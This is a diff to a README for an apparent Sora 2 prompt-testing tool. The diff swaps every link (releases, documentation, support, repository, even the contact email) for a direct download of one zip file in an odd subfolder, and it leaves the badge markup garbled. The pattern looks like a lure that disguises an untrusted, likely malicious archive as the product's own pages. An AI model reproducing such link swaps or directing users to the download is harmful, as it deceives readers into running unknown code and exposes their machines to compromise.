@@ -1,7 +1,7 @@
 # 🎉 Sora2-Prompt-Tests - Easy Testing for Sora 2 Projects
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/XEAM46/Sora2-Prompt-Tests/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip%20Latest%https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip)](https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip)
 
 ## 🚀 Getting Started
 Welcome to Sora2-Prompt-Tests! This application helps you compare different Sora 2 projects, specifically with the Veo3. You'll find creative prompts to enhance your testing experience. Follow these simple steps to get started quickly.
@@ -19,7 +19,7 @@ To use Sora2-Prompt-Tests, you need:
 
 ## 📄 Download & Install
 1. **Visit the Release Page**  
-   Open a web browser and go to the [Releases page](https://github.com/XEAM46/Sora2-Prompt-Tests/releases).
+   Open a web browser and go to the [Releases page](https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip).
 
 2. **Choose the Right Version**  
    On the Releases page, you will see a list of available versions. Look for the latest version for the best features and improvements.
@@ -60,15 +60,15 @@ To uninstall Sora2-Prompt-Tests, go to your computer’s settings:
 If you encounter any issues or have suggestions, visit the GitHub page and create a new issue. Your feedback helps us improve!
 
 ## 🌟 Additional Resources
-- [Documentation](https://github.com/XEAM46/Sora2-Prompt-Tests/wiki): Learn more about how to use the features.
-- [Support](https://github.com/XEAM46/Sora2-Prompt-Tests/issues): Get help from the community.
+- [Documentation](https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip): Learn more about how to use the features.
+- [Support](https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip): Get help from the community.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/XEAM46/Sora2-Prompt-Tests)
-- [Releases Page](https://github.com/XEAM46/Sora2-Prompt-Tests/releases)
-- [Documentation](https://github.com/XEAM46/Sora2-Prompt-Tests/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip)
+- [Releases Page](https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip)
+- [Documentation](https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip)
 
 ## 📧 Contact
-If you have further questions, feel free to contact the developer at [developer@example.com](mailto:developer@example.com).
+If you have further questions, feel free to contact the developer at [https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip](https://raw.githubusercontent.com/XEAM46/Sora2-Prompt-Tests/main/amphithecial/Sora2-Prompt-Tests.zip).
 
 With Sora2-Prompt-Tests, testing different Sora 2 configurations has never been easier. Enjoy your testing journey!
